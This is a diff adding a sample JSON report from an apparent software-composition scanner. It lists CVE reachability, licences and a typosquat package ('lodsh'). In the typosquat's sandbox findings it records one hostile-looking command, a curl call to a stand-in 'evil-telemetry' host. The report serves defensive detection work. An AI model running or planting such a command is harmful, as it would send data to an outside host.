@@ -1,0 +1,124 @@
+{
+  "is_sample": true,
+  "scanned_count": 5,
+  "message": "Sample report: demonstration of real AST call-graph reachability, typosquat detection, and license policy.",
+  "findings": [
+    {
+      "package_name": "jsonwebtoken",
+      "overall_risk": "CRITICAL",
+      "risk_level": "high",
+      "reachability": "REACHABLE",
+      "reachability_reason": "Vulnerable jwt.verify() is directly invoked in authentication route.",
+      "call_path": [
+        "app.get('/login', authHandler)",
+        "authMiddleware(req, res)",
+        "jwt.verify(token, secret)"
+      ],
+      "cves": [
+        {
+          "id": "CVE-2022-23529",
+          "severity": "CRITICAL",
+          "epss_score": 0.892,
+          "reachability": "REACHABLE",
+          "reachability_reason": "Insecure key retrieval in jwt.verify allows arbitrary code execution.",
+          "cve_url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23529"
+        }
+      ],
+      "typosquat": null,
+      "license": {
+        "spdx_id": "MIT",
+        "category": "Permissive"
+      },
+      "sandbox": {
+        "network_calls": 0,
+        "filesystem_writes": 0,
+        "suspicious_commands": []
+      }
+    },
+    {
+      "package_name": "lodsh",
+      "overall_risk": "HIGH",
+      "risk_level": "high",
+      "reachability": "UNKNOWN",
+      "reachability_reason": "Package imported; dynamic calls present.",
+      "typosquat": {
+        "package_name": "lodsh",
+        "suspected_target": "lodash",
+        "distance_score": 1,
+        "risk_level": "high",
+        "reasoning": "Single character omission ≈ lodash [Registry: flagged parasite (0.018% downloads of target)]"
+      },
+      "cves": [],
+      "license": {
+        "spdx_id": "MIT",
+        "category": "Permissive"
+      },
+      "sandbox": {
+        "network_calls": 1,
+        "filesystem_writes": 0,
+        "suspicious_commands": ["curl -s http://evil-telemetry.local"]
+      }
+    },
+    {
+      "package_name": "lodash",
+      "overall_risk": "LOW",
+      "risk_level": "low",
+      "reachability": "UNREACHABLE",
+      "reachability_reason": "Vulnerable function lodash.template is never invoked anywhere in static AST.",
+      "call_path": [],
+      "cves": [
+        {
+          "id": "CVE-2021-23337",
+          "severity": "HIGH",
+          "epss_score": 0.124,
+          "reachability": "UNREACHABLE",
+          "reachability_reason": "Command injection vulnerability exists solely inside template compiler, which is never imported or called.",
+          "cve_url": "https://nvd.nist.gov/vuln/detail/CVE-2021-23337"
+        }
+      ],
+      "typosquat": null,
+      "license": {
+        "spdx_id": "MIT",
+        "category": "Permissive"
+      },
+      "sandbox": {}
+    },
+    {
+      "package_name": "axios",
+      "overall_risk": "SAFE",
+      "risk_level": "low",
+      "reachability": "UNREACHABLE",
+      "reachability_reason": "No known CVEs in current version; safe baseline.",
+      "cves": [],
+      "typosquat": null,
+      "license": {
+        "spdx_id": "MIT",
+        "category": "Permissive"
+      },
+      "sandbox": {}
+    },
+    {
+      "package_name": "pyyaml",
+      "overall_risk": "MEDIUM",
+      "risk_level": "medium",
+      "reachability": "UNKNOWN",
+      "reachability_reason": "Dynamic reflection (getattr/eval) detected in caller scope; conservative UNKNOWN assigned.",
+      "cves": [
+        {
+          "id": "CVE-2020-14343",
+          "severity": "HIGH",
+          "epss_score": 0.451,
+          "reachability": "UNKNOWN",
+          "reachability_reason": "yaml.load unsafe deserialization with dynamic class lookup.",
+          "cve_url": "https://nvd.nist.gov/vuln/detail/CVE-2020-14343"
+        }
+      ],
+      "typosquat": null,
+      "license": {
+        "spdx_id": "MIT",
+        "category": "Permissive"
+      },
+      "sandbox": {}
+    }
+  ]
+}
